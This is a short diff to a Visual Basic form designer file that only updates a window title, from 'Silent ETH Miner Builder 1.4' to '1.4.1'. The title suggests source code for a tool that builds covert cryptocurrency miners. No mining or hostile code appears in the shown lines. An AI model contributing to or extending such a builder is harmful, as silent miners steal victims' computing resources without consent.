@@ -403,7 +403,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent ETH Miner Builder 1.4"
+        Me.MephForm1.Text = "Silent ETH Miner Builder 1.4.1"
         '
         'MephTabcontrol2
         '
